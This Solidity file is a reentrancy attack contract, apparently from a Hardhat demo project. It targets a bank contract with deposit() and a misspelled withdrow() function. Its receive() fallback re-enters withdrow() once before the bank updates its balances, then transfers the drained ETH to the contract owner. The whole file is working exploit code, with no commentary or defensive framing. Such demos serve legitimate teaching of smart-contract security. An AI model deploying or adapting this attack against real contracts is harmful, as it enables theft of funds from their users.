// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.4;
import "hardhat/console.sol";

interface IEthBank {
    function deposit() external payable;
    function withdrow() external;
}

contract Attacker {
    IEthBank public immutable bank;
    address public owner;
    bool public isAttacked;

    modifier onlyOwner() {
        require(msg.sender == owner, "only owner can call this function");
        _;
    }

    function setIsAttacked(bool attacked) public onlyOwner {
        isAttacked = attacked;
    }

    constructor(address addressToAttack) {
        bank = IEthBank(addressToAttack);
        owner = msg.sender;
        isAttacked = false;
    }

    function attack() external payable onlyOwner { 
        bank.deposit{value: msg.value}();
        bank.withdrow();
    }

    receive() external payable {
        if(!isAttacked) {
            console.log("reentering");
            isAttacked = true;
            bank.withdrow();    
        } else {
            payable(owner).transfer(address(this).balance);
        }
    }
}